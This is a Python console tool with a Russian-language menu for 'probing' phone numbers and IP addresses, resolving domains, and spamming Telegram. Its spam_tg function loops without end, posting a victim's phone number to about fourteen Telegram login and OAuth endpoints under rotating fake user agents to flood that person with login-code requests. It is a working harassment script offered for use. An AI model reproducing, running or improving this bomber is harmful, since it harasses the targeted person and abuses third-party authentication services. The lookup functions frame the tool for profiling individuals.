import customtkinter
from socket import gethostbyname
from colorama import Fore, Style
import fake_useragent
import requests
import random
import string
import random
import whois
import time
import json
import os

cyan = Style.BRIGHT + Fore.CYAN
purple = Style.DIM + Fore.MAGENTA

user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"


def printDelay(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.2)
    print()

banner = """
    $$\   $$\  $$$$$$\        $$\   $$\  $$$$$$\ $$$$$$$$\ $$$$$$$$\ 
    $$$\  $$ |$$  __$$\       $$ |  $$ |$$  __$$\\__$$  __|$$  _____|
    $$$$\ $$ |$$ /  $$ |      $$ |  $$ |$$ /  $$ |  $$ |   $$ |      
    $$ $$\$$ |$$ |  $$ |      $$$$$$$$ |$$$$$$$$ |  $$ |   $$$$$\    
    $$ \$$$$ |$$ |  $$ |      $$  __$$ |$$  __$$ |  $$ |   $$  __|   
    $$ |\$$$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |      
    $$ | \$$ | $$$$$$  |      $$ |  $$ |$$ |  $$ |  $$ |   $$$$$$$$\ 
    \__|  \__| \______/       \__|  \__|\__|  \__|  \__|   \________|

              ╔════════════════════════════════════╗
              ║               ФУНКЦИИ              ║
              ╠════════════════════════════════════╣
              ║         Пробив по номеру: 1        ║
              ║           Пробив по IP: 2          ║
              ║        Спамер для telegram: 3      ║
              ║        Узнать ip по домену: 4      ║
              ╠════════════════════════════════════╣
              ║              Выход: 0              ║
              ╚════════════════════════════════════╝
"""

def search_phone(phone: str):
    url = f"https://fincalculator.ru/api/tel/{phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    
    if response.status_code == 200:
        data = json.loads(response.text)
    
        print(Fore.YELLOW + "\nPhone Info📞")
        printDelay(f"Страна: " + data["country"] if data["country"] != "" else "Не найдено")
        printDelay(f"Регион: " + data["region"] if data["region"] != "" else "Не найдено")
        printDelay(f"Оператор: " + data["operator"] if data["operator"] != "" else "Не найдено")
    
    print("")
    input(purple + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")
        
def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()
    
    print(Fore.YELLOW + "\nIP Info🌐")
    try:
        printDelay(f"Страна: {data['country']}")
        printDelay(f"Регион: {data['region']}")
        printDelay(f"Город: {data['city']}")
    except:
        printDelay("Страна: Не найдено")
        printDelay("Регион: Не найдено")
        printDelay("Город: Не найдено")
    
    print("")
    input(purple + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")
    
def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]
    
    while True:
        for url in urls:
            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}
    
            requests.post(url, headers=headers, data={'phone': phone})
            print(cyan + "Send to tg!")
            time.sleep(0.5)

def get_ip(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)
    print(Fore.YELLOW + "\nDomen Info📰")
    printDelay(f"IP: {ip}")
            
    print("")
    input(purple + "[PRESS ENTER TO CONTINIE...]")
    os.system("clear")
    
def main():
    while True:
        Fore.RESET
        
        print(purple + banner)
        print()
        select = input("[ENTER THE FUNCTION NUMBER]: ")
        
        if select == "1":
            phone = input(purple + "[ENTER THE PHONE]: ")
            search_phone(phone)
        
        if select == "2":
            ip = input(purple + "[ENTER THE IP]: ")
            search_ip(ip)
            
        if select == "3":
            phone = input(purple + "[ENTER THE PHONE]: ")
            spam_tg(phone)
        
        if select == "4":
            domen = input(purple + "[ENTER THE DOMEN]: ")
            get_ip(domen)
        
        if select == "0":
            break

os.system("clear")
main()
